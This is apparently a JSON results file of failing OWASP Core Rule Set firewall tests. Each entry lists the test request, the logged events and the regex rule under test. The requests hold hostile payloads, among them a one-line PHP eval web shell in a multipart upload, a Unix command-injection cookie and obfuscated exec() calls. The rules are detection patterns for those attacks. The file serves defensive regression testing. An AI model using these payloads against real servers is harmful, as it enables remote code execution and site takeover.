            "Cookie" : "uname$u -a"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS|XML:/* \"@rx (?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+\" \"id:932240,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Remote Command Execution: Unix Command Injection evasion attempt detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-shell',\\\n  tag:'platform-unix',\\\n  tag:'attack-rce',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RCE',\\\n  tag:'capec/1000/152/248/88',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.932240_matched_var_name=%{matched_var_name}',\\\n  chain\"", "SecRule MATCHED_VARS \"!@rx [0-9]\\s*\\'\\s*[0-9]\" \"t:none,\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "933110",
    "test_id" : 28,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933110.yaml",
    "description" : "PHP upload via multipart",
    "cause" : "failed expect_id check: 933110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 28,
      "desc" : "PHP upload via multipart",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Content-Type" : "multipart/form-data; boundary=--------397236876"
          },
          "uri" : "/post",
          "data" : "----------397236876\nContent-Disposition: form-data; name=\"fileRap\"; filename=\"something/dangerous.php\"\nContent-Type: text/plain\n\nplease block me\n----------397236876--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 933110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule FILES|REQUEST_HEADERS:X-Filename|REQUEST_HEADERS:X_Filename|REQUEST_HEADERS:X.Filename|REQUEST_HEADERS:X-File-Name \"@rx .*\\.ph(?:p\\d*|tml|ar|ps|t|pt)\\.*$\" \"id:933110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'PHP Injection Attack: PHP Script File Upload Found',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-php',\\\n  tag:'platform-multi',\\\n  tag:'attack-injection-php',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-PHP',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.php_injection_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "933110",
    "test_id" : 29,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933110.yaml",
    "description" : "PHP upload via multipart should pass",
    "cause" : "failed no_expect_ids check: 933110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=933110 - PHP Injection Attack: PHP Script File Upload Found" ]
    },
    "test" : {
      "test_id" : 29,
      "desc" : "PHP upload via multipart should pass",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Content-Type" : "multipart/form-data; boundary=--------397236876"
          },
          "uri" : "/post",
          "data" : "----------397236876\nContent-Disposition: form-data; name=\"something/dangerous.php\"; filename=\"safe.txt\"\nContent-Type: text/plain\n\nplease don't block me\n----------397236876--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 933110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule FILES|REQUEST_HEADERS:X-Filename|REQUEST_HEADERS:X_Filename|REQUEST_HEADERS:X.Filename|REQUEST_HEADERS:X-File-Name \"@rx .*\\.ph(?:p\\d*|tml|ar|ps|t|pt)\\.*$\" \"id:933110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'PHP Injection Attack: PHP Script File Upload Found',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-php',\\\n  tag:'platform-multi',\\\n  tag:'attack-injection-php',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-PHP',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.php_injection_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "933111",
    "test_id" : 1,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933111.yaml",
    "description" : "PHP Injection Attack: PHP Script File Upload Found",
    "cause" : "failed expect_id check: 933111 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "PHP Injection Attack: PHP Script File Upload Found",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryoRWIb3busvBrbttO",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "uri" : "/post",
          "port" : 80,
          "data" : "------WebKitFormBoundaryoRWIb3busvBrbttO\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php.jpg\"\nContent-Type: image/jpeg\n\n<?php @eval($_POST[\"hacker\"]); ?>\n\n------WebKitFormBoundaryoRWIb3busvBrbttO--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 933111 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule FILES|REQUEST_HEADERS:X-Filename|REQUEST_HEADERS:X_Filename|REQUEST_HEADERS:X.Filename|REQUEST_HEADERS:X-File-Name \"@rx .*\\.(?:php\\d*|phtml)\\..*$\" \"id:933111,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'PHP Injection Attack: PHP Script File Upload Found',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-php',\\\n  tag:'platform-multi',\\\n  tag:'attack-injection-php',\\\n  tag:'paranoia-level/3',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-PHP',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.php_injection_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "933120",
    "test_id" : 2,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933120.yaml",
    "description" : "Test correct logging",
    "cause" : "nothing checked for test 2",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=1 rule_id=920510 - Invalid Cache-Control request header", "phase=2 rule_id=933120 - PHP Injection Attack: Configuration Directive Found" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test correct logging",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "Cache-Control" : "no-cache, no-store, must-revalidate",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "uri" : "/post",
          "port" : 80,
          "data" : "var=session.referer_check%3dtrue",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "match_regex" : "session.referer_check=t found within ARGS:var:"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)\\b(?:a(?:llow_url_(?:fopen|include)|pc.(?:coredump_unmap|en(?:able(?:_cli|d)|tries_hint)|(?:gc_)?ttl|mmap_file_mask|preload_path|s(?:erializer|hm_s(?:egments|ize)|lam_defense)|use_request_time)|rg_separator.(?:in|out)put|ssert.(?:active|(?:bai|quiet_eva)l|callback|exception|warning)|uto_(?:(?:ap|pre)pend_file|detect_line_endings|globals_jit))|b(?:cmath.scale|rowscap)|c(?:gi.(?:check_shebang_line|(?:discard_pat|np)h|f(?:ix_pathinfo|orce_redirect)|r(?:edirect_status_env|fc2616_headers))|hild_terminate|li(?:_server.color|.p(?:ager|rompt))|om.(?:a(?:llow_dcom|utoregister_(?:(?:casesensitiv|verbos)e|typelib))|(?:code_pag|typelib_fil)e|dotnet_version)|url.cainfo)|d(?:ate.(?:(?:default_l(?:at|ong)itud|timezon)e|sun(?:rise|set)_zenith)|ba.default_handler|efault_(?:(?:charse|socket_timeou)t|mimetype)|is(?:able_(?:classe|function)|play_(?:startup_)?error)s|oc(?:_roo|ref_(?:ex|roo))t)|e(?:n(?:able_(?:dl|post_data_reading)|gine)|rror_(?:(?:(?:ap|pre)pend_str|report)in|lo)g|x(?:i(?:f.(?:decode_(?:jis|unicode)_(?:intel|motorola)|encode_(?:jis|unicode))|t_on_timeout)|tension(?:_dir)?|p(?:ect.(?:log(?:file|user)|match_max|timeout)|ose_php)))|f(?:astcgi.(?:impersonate|logging)|fi.(?:enable|preload)|il(?:e_uploads|ter.default(?:_flags)?))|g(?:d.jpeg_ignore_warning|eoip.custom_directory)|h(?:ard_timeout|ighlight.(?:(?:commen|defaul)t|html|keyword|string)|tml_errors)|i(?:b(?:ase.(?:(?:allow_persisten|time(?:stamp)?forma)t|d(?:ateformat|efault_(?:charset|db|password|user))|max_(?:links|persistent))|m_db2.(?:binmode|i(?:5_(?:all(?:_pconnec|ow_commi)t|dbcs_alloc|ignore_userid)|nstance_name)))|conv.(?:in(?:put|ternal)|output)_encoding|g(?:binary.compact_strings|nore_(?:repeated_(?:errors|source)|user_abort))|m(?:a(?:gick.(?:locale_fix|progress_monitor|skip_version_check)|p.enable_insecure_rsh)|plicit_flush)|n(?:clude_path|put_encoding|t(?:ernal_encoding|l.(?:default_locale|error_level|use_exceptions))))|l(?:dap.max_links|og_errors(?:_max_len)?)|m(?:a(?:gic_quotes_(?:gpc|runtime)|il(?:.(?:add_x_header|force_extra_parameters|log)|parse.def_charset)|x_(?:execution_time|file_uploads|input_(?:nesting_level|time|vars)))|bstring.(?:detect_order|encoding_translation|func_overload|http_(?:input|output(?:_conv_mimetypes)?)|internal_encoding|language|regex_(?:retry|stack)_limit|s(?:trict_detection|ubstitute_character))|crypt.(?:algorithm|mode)s_dir|em(?:cache(?:.(?:allow_failover|c(?:hunk_size|ompress_threshold)|(?:default_por|lock_timeou)t|hash_(?:function|strategy)|max_failover_attempts|protocol|(?:session_)?redundancy)|d.(?:compression_(?:factor|t(?:hreshold|ype))|default_(?:binary_protocol|con(?:nect_timeout|sistent_hash))|s(?:e(?:rializer|ss_(?:binary(?:_protocol)?|con(?:nect_timeout|sistent_hash(?:_type)?)|lock(?:_(?:expire|retries|wait(?:_m(?:ax|in))?)|ing)|number_of_replicas|p(?:ersistent|refix)|r(?:andomize_replica_read|emove_failed(?:_servers)?)|s(?:asl_(?:password|username)|erver_failure_limit)))|tore_retry_count)|use_sasl))|ory_limit)|ysql(?:.(?:allow_(?:local_infile|persistent)|connect_timeout|default_(?:(?:hos|socke)t|p(?:assword|ort)|user)|max_(?:links|persistent)|trace_mode)|i.(?:allow_(?:local_infile|persistent)|default_(?:(?:hos|socke)t|p(?:ort|w)|user)|local_infile_directory|max_(?:links|persistent)|r(?:econnect|ollback_on_cached_plink))|nd.(?:collect_(?:memory_)?statistics|debug|(?:fetch_data_cop|sha256_server_public_ke)y|log_mask|mempool_default_size|net_(?:cmd_buffer_size|read_(?:buffer_size|timeout))|trace_alloc)))|o(?:ci8.(?:(?:connection_clas|event|old_oci_close_semantic)s|default_prefetch|max_persistent|p(?:ersistent_timeout|ing_interval|r(?:efetch_lob_size|ivileged_connect))|statement_cache_size)|dbc.(?:(?:allow|check)_persistent|default(?:_(?:cursortype|db|pw|user)|binmode|lrl)|max_(?:links|persistent))|p(?:cache.(?:blacklist_filename|c(?:ache_id|onsistency_checks)|dups_fix|e(?:nable(?:_(?:cli|file_override))?|rror_log)|f(?:ast_shutdown|ile_(?:cache(?:_(?:consistency_checks|fallback|only))?|update_protection)|orce_restart_timeout)|(?:huge_code_page|save_comment)s|in(?:herited_hack|terned_strings_buffer)|jit(?:_(?:b(?:isect_limit|(?:lacklist_(?:root|side)_trac|uffer_siz)e)|debug|hot_(?:func|loop|return|side_exit)|max_(?:exit_counter|(?:loop_unro|polymorphic_ca)ll|r(?:ecursive_(?:call|return)|oot_trace)|side_trace)s|prof_threshold))?|lo(?:ckfile_path|g_verbosity_level)|m(?:ax_(?:accelerated_files|(?:file_siz|wasted_percentag)e)|emory_consumption|map_base)|opt(?:_debug|imization)_level|pr(?:e(?:ferred_memory_model|load(?:_user)?)|otect_memory)|re(?:cord_warnings|strict_api|validate_(?:freq|path))|use_cwd|validate_(?:permission|root|timestamps))|en(?:_basedir|ssl.ca(?:file|path)))|utput_(?:(?:buffer|encod)ing|handler))|p(?:cre.(?:(?:backtrack|recursion)_lim|j)it|do(?:_odbc.(?:connection_pooling|db2_instance_name)|.dsn)|gsql.(?:a(?:llow|uto_reset)_persistent|(?:ignore|log)_notice|max_(?:links|persistent))|h(?:ar.(?:cache_list|re(?:adonly|quire_hash))|pdbg.(?:eol|path))|recision|ost_max_size)|r(?:e(?:alpath_cache_(?:size|ttl)|gister_argc_argv|port_(?:memleaks|zend_debug)|quest_order)|unkit.(?:internal_override|superglobal))|s(?:e(?:aslog.(?:appender(?:_retry)?|buffer_(?:disabled_in_cli|size)|d(?:efault_(?:basepath|datetime_format|logger|template)|isting_(?:(?:by_hou|folde)r|type))|ignore_warning|level|re(?:call_depth|mote_(?:hos|por|timeou)t)|t(?:hrow_exception|r(?:ace_(?:e(?:rror|xception)|notice|warning)|im_wrap))|use_buffer)|ndmail_(?:from|path)|rialize_precision|ssion.(?:auto_start|c(?:ache_(?:expire|limiter)|ookie_(?:domain|httponly|(?:lifetim|s(?:amesit|ecur))e|path))|entropy_(?:file|length)|gc_(?:divisor|maxlifetime|probability)|hash_(?:bits_per_character|function)|(?:lazy_writ|nam)e|referer_check|s(?:ave_(?:handler|path)|erialize_handler|id_(?:bits_per_character|length))|trans_sid_(?:host|tag)s|u(?:pload_progress.(?:cleanup|enabled|(?:min_)?freq|name|prefix)|se_(?:(?:only_)?cookies|strict_mode|trans_sid))))|hort_open_tag|mtp(?:_port)?|oap.wsdl_cache(?:_(?:dir|enabled|limit|ttl))?|ql(?:.safe_mode|ite3.(?:defensive|extension_dir))|tomp.default_(?:broker|(?:connection|read)_timeout_u?sec)|woole.(?:aio_thread_num|display_errors|enable_(?:coroutine|library|preemptive_scheduler)|(?:fast_serializ|u(?:nixsock_buffer_siz|se_(?:namespac|shortnam)))e)|ys(?:_temp_dir|log.(?:f(?:acility|ilter)|ident)|vshm.init_mem))|t(?:aint.e(?:nable|rror_level)|idy.(?:clean_output|default_config)|ra(?:ck_errors|der.real_(?:precision|round_mode)))|u(?:nserialize_(?:callback_func|max_depth)|opz.(?:disable|exit|overloads)|pload(?:_(?:max_filesize|tmp_dir)|progress.file.filename_template)|rl_rewriter.(?:host|tag)s|ser_(?:agent|dir|ini.(?:cache_ttl|filename)))|v(?:8js.(?:flag|max_disposed_context)s|ariables_order|ld.(?:(?:activ|execut)e|skip_(?:ap|pre)pend))|w(?:in(?:cache.(?:chkinterval|enablecli|f(?:c(?:achesize|enabled(?:filter)?|ndetect)|ile(?:count|mapdir))|(?:ignorelis|namesal)t|maxfilesize|oc(?:achesize|enabled(?:filter)?)|reroute(?:_enabled|ini)|s(?:cachesize|rwlocks)|ttlmax|uc(?:achesize|enabled))|dows.show_crt_warning)|khtmltox.graphics)|x(?:bithack|hprof.output_dir|mlrpc_error(?:_number|s))|ya(?:c(?:.(?:compress_threshold|debug|enable(?:_cli)?|(?:key|value)s_memory_size|serializer)|onf.(?:check_dela|director)y)|f.(?:action_prefer|cache_config|environ|forward_limit|l(?:ibrary|owcase_path)|name_s(?:eparator|uffix)|use_(?:namespace|spl_autoload))|ml.(?:decode_(?:binary|(?:ph|timestam)p)|output_(?:canonical|indent|width))|r.(?:(?:connect_)?timeout|debug|expose_info|packager)|z.(?:keepalive|log_mask))|z(?:end(?:_extension|.(?:assertions|(?:detect_unicod|multibyt)e|e(?:nable_gc|xception_(?:ignore_args|string_param_max_len))|s(?:cript_encoding|ignal_check)))|lib.output_(?:compression(?:_level)?|handler)|ookeeper.(?:recv_timeout|sess(?:_lock_wait|ion_lock))))[\\s\\x0b]*=[^=]\" \"id:933120,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:normalizePath,\\\n  msg:'PHP Injection Attack: Configuration Directive Found',\\\n  logdata:'Matched Data: %{TX.0} found within %{TX.933120_MATCHED_VAR_NAME}: %{TX.933120_MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-php',\\\n  tag:'platform-multi',\\\n  tag:'attack-injection-php',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-PHP',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.933120_matched_var=%{MATCHED_VAR}',\\\n  setvar:'tx.933120_matched_var_name=%{MATCHED_VAR_NAME}',\\\n  setvar:'tx.php_injection_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "933160",
    "test_id" : 16,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933160.yaml",
    "description" : "PHP function call with c-style comment syntax containing newline, whitespaces and vertical tab.\npayload: exec\\t/*foo\\r\\nbar*/\\t ()\n",
    "cause" : "failed expect_id check: 933160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=921151 - HTTP Header Injection Attack via payload (CR/LF detected)", "phase=2 rule_id=920230 - Multiple URL Encoding Detected", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=932190 - Remote Command Execution: Wildcard bypass technique attempt", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "PHP function call with c-style comment syntax containing newline, whitespaces and vertical tab.\npayload: exec\\t/*foo\\r\\nbar*/\\t ()\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=exec%09%2f%2afoo%0d%0abar%2a%2f%09%20%28%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 933160 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)\\b\\(?[\\\"']*(?:assert(?:_options)?|c(?:hr|reate_function)|e(?:val|x(?:ec|p))|f(?:ile(?:group)?|open|puts)|glob|i(?:mage(?:gif|(?:jpe|pn)g|wbmp|xbm)|s_a)|m(?:d5|kdir)|o(?:pendir|rd)|p(?:assthru|open|r(?:intf|ev))|r(?:eadfile|trim)|s(?:t(?:rip_tags|at)|ubstr|ystem)|tmpfile|u(?:n(?:pac|lin)k|sort))(?:/(?:\\*.*?\\*/|/[^\\n\\r]*)|#[^\\n\\r]*|[\\s\\x0b\\\"])*[\\\"']*\\)?[\\s\\x0b]*\\([^\\)]*\\)\" \"id:933160,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'PHP Injection Attack: High-Risk PHP Function Call Found',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-php',\\\n  tag:'platform-multi',\\\n  tag:'attack-injection-php',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-PHP',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.php_injection_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934100",
    "test_id" : 5,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934100.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 934100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920230 - Multiple URL Encoding Detected", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941390 - Javascript method detected" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=new+Function+%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934100 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_FILENAME|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* \"@rx _(?:\\$\\$ND_FUNC\\$\\$_|_js_function)|(?:\\beval|new[\\s\\x0b]+Function[\\s\\x0b]*)\\(|(?:String\\.fromCharCod|Module:prototyp)e|function\\(\\)\\{|this\\.constructor|module\\.exports=|\\([\\s\\x0b]*[^0-9A-Z_a-z]child_process[^0-9A-Z_a-z][\\s\\x0b]*\\)|cons(?:tructor:constructor|ole(?:\\.(?:(?:debu|lo)g|error|info|trace|warn)(?:\\.call)?\\(|\\[[\\\"'`](?:(?:debu|lo)g|error|info|trace|warn)[\\\"'`]\\]))|process(?:\\.(?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?(?:\\.call)?\\(|binding|constructor|env|global|main(?:Module)?|process|require)|\\[[\\\"'`](?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?|binding|constructor|env|global|main(?:Module)?|process|require)[\\\"'`]\\])|(?:binding|constructor|env|global|main(?:Module)?|process|require)\\[|require(?:\\.(?:resolve(?:\\.call)?\\(|main|extensions|cache)|\\[[\\\"'`](?:(?:resolv|cach)e|main|extensions)[\\\"'`]\\])\" \"id:934100,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:urlDecodeUni,\\\n  t:jsDecode,\\\n  t:removeWhitespace,\\\n  t:base64Decode,\\\n  t:urlDecodeUni,\\\n  t:jsDecode,\\\n  t:removeWhitespace,\\\n  msg:'Node.js Injection Attack 1/2',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-javascript',\\\n  tag:'platform-multi',\\\n  tag:'platform-nodejs',\\\n  tag:'attack-rce',\\\n  tag:'attack-injection-generic',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  multiMatch,\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934120",
    "test_id" : 23,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 1 - digits",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
